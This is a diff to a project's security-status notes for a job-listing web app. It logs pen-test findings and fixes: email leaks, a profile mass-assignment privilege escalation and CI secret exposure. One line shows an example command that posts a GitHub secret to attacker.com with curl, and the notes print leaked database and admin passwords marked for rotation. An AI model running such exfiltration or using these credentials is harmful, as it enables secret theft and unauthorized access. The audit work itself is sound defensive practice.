@@ -35,8 +35,22 @@ User-requested aggressive pen-test of production. Findings shipped on `main` (3 
 **Outstanding owed by user (cannot fix in code):**
 - Rotate **Resend API key** `re_ZECNG5Y8_…` (in git history, public repo).
 - Rotate **MongoDB password** `StrongPassword123!` (same).
-- Confirm admin password is no longer `admin123!@#`.
+- Confirm admin password is no longer `admin123!@#`. (`backend/scripts/rotate-admin-password.js` makes it a one-liner.)
 - Make repo private OR rewrite history with `git-filter-repo`.
+
+### Round 2 (commit `9886313`) — email-leak hunt
+- 🚨 **`GET /api/jobs/:id`** (public, optionalAuth) was populating `email` on `employerId` — anyone scraping job listings got every employer's auth email for credential-stuffing. Removed `email` from populate field list; companyName/website/phone/whatsapp remain (intentional contact info).
+- 🟡 **`GET /api/reports`** (own submitted reports, authenticated user) was populating `reportedUser` with `email` — let any authenticated user harvest the auth email of anyone they reported. Removed; firstName/lastName/userType remain.
+
+### Round 3 (Mr-Robot mode, pending commit) — chained / trust-boundary attacks
+- 🚨 **Mass-assignment privilege escalation in `PUT /api/users/profile`** (`backend/src/routes/users.js`): for `verified=false` employers, the unverified branch did `{ ...stored, ...employerProfile, verified, ... }` which let an unverified employer set sensitive schema fields — `subscriptionTier` (basic/premium), `isAdministrataAccount` (Boolean — flips the "verified govt account" badge), `candidateMatchingEnabled`, `candidateMatchingJobs`. Free path to premium tier + Administrata badge bypass. **Fixed**: strict allowlist on both verified and unverified paths (unverified additionally allows `companyName`, `industry`, `logo` for initial profile completion).
+- 🚨 **GitHub Actions secret exposure** (`.github/workflows/qa-tests.yml`): the auto-triggered `backend` job (runs on `pull_request`) was set up to receive `${{ secrets.OPENAI_API_KEY }}` and `${{ secrets.RESEND_API_KEY }}`. A malicious branch could amend the workflow to `curl attacker.com -d "${{ secrets.X }}"` and exfiltrate. **Fixed defensively before file was tracked**: replaced with `sk-ci-placeholder-not-real` / `re_ci_placeholder_not_real`. Real keys stay only on `workflow_dispatch`-gated jobs (manual trigger).
+- 🟡 **Cloudinary resume URLs are public** (default `type: 'upload'`). Mitigated in practice (~144-bit unguessable URL space, no leakage in API responses, no embedding in emails) but proper fix is `type: 'authenticated'` + signed URLs. Deferred to week-1 post-launch.
+- 🟢 **Frontend Sentry not actually running** — bundle has no DSN at build time; `VITE_SENTRY_DSN` not set on Vercel. Documented for user.
+- 🟢 **HSTS preload header set** (1y, includeSubDomains, preload) but domain not submitted to https://hstspreload.org/?domain=advance.al. Documented for user.
+- 🟢 **Signup response echoes unsubscribe token** in `/api/quickusers` POST. Token itself is 32-byte random; only leaks via DevTools/Sentry/logs. Cleaner pattern: send `unsubscribeUrl` in email only. Deferred.
+
+**Verified explicitly safe (do NOT regress):** no eval/Function/exec on user input; no template engines (no SSTI); admin routes blanket-protected by `router.use(authenticate); router.use(requireAdmin)`; JWT pinned to HS256 (alg:none rejected); refresh tokens have JTI + are removed before reissue; Application schema has DB-level unique constraint `(jobId, jobseekerId)` with partialFilterExpression — concurrent duplicate apply cannot succeed under race; magic-byte validation live for resume uploads; DAST sweep across 16+ classic exposure paths returns 404/Cloudflare-blocked.
 
 ## 🟡 **PRODUCTION LAUNCH — SEO/GEO FOUNDATION — APRIL 28, 2026 (IN PROGRESS)**
 
